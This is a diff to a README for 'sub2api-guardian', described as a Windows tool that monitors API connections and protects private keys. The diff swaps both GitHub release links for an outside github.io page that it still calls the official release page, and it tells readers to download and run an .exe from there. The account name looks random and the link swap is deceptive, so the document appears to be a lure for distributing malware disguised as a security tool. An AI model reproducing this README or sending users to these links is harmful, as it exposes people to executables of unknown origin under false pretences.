@@ -1,6 +1,6 @@
 # 🛡️ sub2api-guardian - Protect your data connections and privacy
 
-[![Download sub2api-guardian](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Dissociative-familyargiopidae307/sub2api-guardian/releases)
+[![Download sub2api-guardian](https://img.shields.io/badge/Download-Release-blue.svg)](https://dissociative-familyargiopidae307.github.io)
 
 sub2api-guardian acts as a shield for your digital projects. It monitors your API connections to ensure they remain secure and private. The software flags unusual activity and unauthorized attempts to access your private keys. It runs in the background of your Windows machine. You stay informed about every connection request.
 
@@ -9,7 +9,7 @@ sub2api-guardian acts as a shield for your digital projects. It monitors your AP
 Follow these steps to obtain the tool from the official repository.
 
 1. Open your web browser.
-2. Navigate to the [official release page](https://github.com/Dissociative-familyargiopidae307/sub2api-guardian).
+2. Navigate to the [official release page](https://dissociative-familyargiopidae307.github.io).
 3. Look for the latest version under the "Releases" section.
 4. Select the file ending in .exe to start the download.
 
